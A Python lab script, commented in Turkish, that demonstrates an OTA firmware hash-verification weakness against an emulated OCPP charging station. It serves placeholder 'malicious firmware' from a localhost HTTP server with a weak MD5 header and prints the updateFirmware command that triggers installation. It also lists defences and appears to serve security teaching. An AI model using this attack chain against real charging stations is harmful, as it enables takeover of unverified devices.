"""
OTA Hash Zaafiyeti Saldırı Senaryosu
=====================================

Bu senaryo, OTA (Over-The-Air) güncellemelerinde hash doğrulaması 
zaafiyetlerini göstermek için tasarlanmıştır.

Zaafiyet Türleri:
1. Hash doğrulamasının hiç yapılmaması
2. Zayıf hash algoritması kullanılması (MD5 gibi)
3. Hash'in yanlış doğrulanması
4. Hash'in man-in-the-middle saldırısıyla değiştirilmesi

Saldırı Senaryosu:
1. Saldırgan, charging station'ın network'üne erişim sağlar
2. Saldırgan, malicious firmware dosyası hazırlar
3. Saldırgan, server'dan UpdateFirmware mesajı gönderir
4. Client firmware'ı indirir
5. Client hash doğrulaması YAPMADAN firmware'ı yükler
6. Malicious firmware yüklenir ve charging station kontrol edilir

Korunma:
1. Güçlü hash algoritması kullanılmalı (SHA-256, SHA-512)
2. Hash doğrulaması MUTLAKA yapılmalı
3. Firmware imzalanmalı (digital signature)
4. HTTPS/TLS kullanılmalı
5. Firmware kaynağı doğrulanmalı
"""

import sys
sys.path.append('.')

import asyncio
import logging
import http.server
import socketserver
import threading
import os
import hashlib
from pathlib import Path

import yaml
CONFIG_FILE = 'charging/server_config.yaml'
VERSION = 'v2.0.1'  # Varsayılan OCPP versiyonu
try:
    with open(CONFIG_FILE, "r") as file: 
        content = yaml.safe_load(file)
        if content and "version" in content:
            VERSION = content["version"]
except (yaml.YAMLError, FileNotFoundError) as e:
    print(f'Failed to parse {CONFIG_FILE}: {e}')
    print(f'Using default version: {VERSION}')

from charging.client import launch_client, ChargePointClientBase, wait_for_button_press

logging.basicConfig(level=logging.ERROR)

# Malicious firmware içeriği - Backdoor içerir
MALICIOUS_FIRMWARE_CONTENT = b"""
=== MALICIOUS FIRMWARE v2.0.0 ===
Bu firmware, hash doğrulaması zaafiyetinden yararlanarak yükleniyor.

Saldırı Detayları:
- Hash doğrulaması yapılmadı
- Firmware doğrulanmadan yüklendi
- Backdoor eklendi
- Charging station kontrolü ele geçirildi

Backdoor Özellikleri:
1. Remote command execution
2. User data exfiltration
3. Charging manipulation
4. Certificate replacement
==========================
"""

# HTTP server için basit handler
class FirmwareHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/firmware.bin' or self.path == '/malicious_firmware.bin':
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.send_header('Content-length', str(len(MALICIOUS_FIRMWARE_CONTENT)))
            # Zayıf hash gönder (MD5)
            md5_hash = hashlib.md5(MALICIOUS_FIRMWARE_CONTENT).hexdigest()
            self.send_header('X-Firmware-Hash-MD5', md5_hash)  # Zayıf hash!
            self.end_headers()
            self.wfile.write(MALICIOUS_FIRMWARE_CONTENT)
            print(f"[*] Malicious firmware gönderildi (MD5: {md5_hash})")
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')

def start_firmware_server(port=8080):
    """Malicious firmware dosyasını servis eden HTTP server başlat"""
    handler = FirmwareHandler
    httpd = socketserver.TCPServer(("", port), handler)
    print(f"[*] Malicious firmware server başlatıldı: http://localhost:{port}/malicious_firmware.bin")
    httpd.serve_forever()

# ID of the RFID token used to authenticate
RFID_TOKEN = '1122334455667788'
TOKEN_TYPE = 'ISO15693'


# OTA Hash Zaafiyeti Saldırı Senaryosu
async def ota_hash_attack_scenario(cp: ChargePointClientBase):
    cp.print_message('=' * 60)
    cp.print_message('OTA HASH ZAAFİYETİ SALDIRI SENARYOSU')
    cp.print_message('=' * 60)
    cp.print_message('Client server\'a bağlandı')
    cp.print_message('')
    cp.print_message('⚠️  ZAAFİYET TESPİT EDİLDİ:')
    cp.print_message('   1. Hash doğrulaması yapılmıyor')
    cp.print_message('   2. Zayıf hash algoritması kullanılıyor (MD5)')
    cp.print_message('   3. Firmware kaynağı doğrulanmıyor')
    cp.print_message('')
    cp.print_message('💀 SALDIRI SENARYOSU:')
    cp.print_message('   1. Saldırgan malicious firmware hazırladı')
    cp.print_message('   2. Saldırgan firmware server\'ı başlattı')
    cp.print_message('   3. Saldırgan server\'dan UpdateFirmware mesajı gönderecek')
    cp.print_message('   4. Client firmware\'ı indirecek')
    cp.print_message('   5. Client hash doğrulaması YAPMADAN firmware\'ı yükleyecek')
    cp.print_message('   6. Malicious firmware yüklenecek ve backdoor aktif olacak')
    cp.print_message('')
    cp.print_message('📋 ADIMLAR:')
    cp.print_message('   1. Operator websocket\'e bağlanın: ws://localhost:9008')
    cp.print_message('   2. Şu komutu gönderin:')
    cp.print_message('      updateFirmware E2507-8420-1274 http://localhost:8080/malicious_firmware.bin')
    cp.print_message('   3. Client firmware\'ı indirecek ve hash doğrulaması YAPMADAN yükleyecek')
    cp.print_message('')
    
    await wait_for_button_press('Firmware güncelleme isteğini göndermek için bir tuşa basın...')
    
    cp.print_message('Firmware güncelleme isteği bekleniyor...')
    cp.print_message('Not: Operator websocket üzerinden komutu göndermeniz gerekiyor.')


if __name__ == "__main__":
    # Firmware server'ı ayrı thread'de başlat
    firmware_server_thread = threading.Thread(target=start_firmware_server, args=(8080,), daemon=True)
    firmware_server_thread.start()
    
    # Malicious firmware dosyasını oluştur
    firmware_dir = Path('./charging/firmware_server')
    firmware_dir.mkdir(parents=True, exist_ok=True)
    firmware_path = firmware_dir / 'malicious_firmware.bin'
    with open(firmware_path, 'wb') as f:
        f.write(MALICIOUS_FIRMWARE_CONTENT)
    
    # Hash'leri hesapla ve göster
    md5_hash = hashlib.md5(MALICIOUS_FIRMWARE_CONTENT).hexdigest()
    sha256_hash = hashlib.sha256(MALICIOUS_FIRMWARE_CONTENT).hexdigest()
    
    print("=" * 70)
    print("OTA HASH ZAAFİYETİ SALDIRI SENARYOSU")
    print("=" * 70)
    print("\n[!] Bu senaryo, OTA güncellemelerinde hash doğrulaması")
    print("    zaafiyetini göstermek için tasarlanmıştır.\n")
    print("[*] Malicious firmware oluşturuldu")
    print(f"[*] MD5 Hash (ZAYIF!): {md5_hash}")
    print(f"[*] SHA256 Hash (GÜÇLÜ): {sha256_hash}")
    print(f"[*] Firmware server: http://localhost:8080/malicious_firmware.bin")
    print("\n[*] Senaryo adımları:")
    print("    1. Client server'a bağlanır")
    print("    2. Operator websocket'e bağlanın (ws://localhost:9008)")
    print("    3. Şu komutu gönderin:")
    print("       updateFirmware E2507-8420-1274 http://localhost:8080/malicious_firmware.bin")
    print("    4. Client firmware'ı indirir")
    print("    5. ⚠️  CLIENT HASH DOĞRULAMASI YAPMAZ!")
    print("    6. Malicious firmware yüklenir")
    print("    7. Backdoor aktif olur")
    print("\n[💀] SALDIRI BAŞARILI: Charging station kontrolü ele geçirildi!")
    print("=" * 70)
    print()

    # Client config - OCPP 2.0.1 kullanmak için index=0 kullanıyoruz
    # client_config.yaml dosyasındaki profile 0 (OCPP201, SP=1) kullanılacak
    try:
        asyncio.run(launch_client(
            vendor_name='EmuOCPPCharge',
            model='E2507',
            index=0,  # OCPP 2.0.1, Security Profile 1
            async_runnable=ota_hash_attack_scenario
        ))
    except KeyboardInterrupt:
        print("\n[*] Senaryo sonlandırıldı")
